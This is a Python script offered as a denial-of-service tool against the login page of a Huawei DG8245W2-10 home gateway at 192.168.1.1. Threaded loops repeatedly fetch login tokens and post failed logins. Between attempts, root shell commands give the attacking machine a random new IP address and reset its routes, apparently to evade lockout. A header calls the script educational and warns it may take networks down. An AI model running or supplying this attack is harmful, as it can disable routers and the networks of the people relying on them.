"""
WARNING:this might take other devices or the whole network down!!
This code is developed for ethical and educational usage only!
"""
import requests
import threading
import logging
import os
import random

#no need to worry about errors, just run it as root!(linux only but can be edited for windows)
#DOS attck on login page of HUAWWEI DG8245W2-10


# Disable insecure request warnings
logging.captureWarnings(True)


# testd on DG8245W2-10 gateway but may work on others (with this blue login page) 
cow_say = '''
 _________________________
< DG8245W2-10 DOS > 
 -------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\\
                ||----w |
                ||     ||
'''
print(cow_say)


#it usually runs over http, but yours may be diffretn 
url = "http://192.168.1.1/login.cgi" #login script (it is not in / as you may think)
turl = "http://192.168.1.1/asp/GetRandCount.asp" #token page(one time only)


threads = 5 # you may need to change this
print()


headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
} #not required but better

lock = threading.Lock()


def bruteit():
    
    while True:
        try:
            while True:
                
                with lock:
                    token = requests.post(turl, headers=headers, allow_redirects=True, verify=False)
                
                    payload = { # do not change the order
                        "UserName": "user",
                        "PassWord":"",
                        "Language": "english",
                        "x.X_HW_Token": token.text[3:]
                    }
                    payload["PassWord"] = "gg"
                
                    res = requests.post(url,data=payload)
                
                    os.system(f"ifconfig eth0 192.168.1.{random.randint(2, 253)}") # change depending on ur NIC name and you subnit
                    os.system("route add -net 192.168.1.0 netmask 255.255.255.0 eth0") # u may need to change this 
                    os.system("route add default gw 192.168.1.1 eth0 ") # you may need to change this
        except:
            bruteit()                   
                        
threads_list = []

for thread in range(1, threads + 1):
    t = threading.Thread(target=bruteit)
    threads_list.append(t)
    t.start()


for t in threads_list:
    t.join()
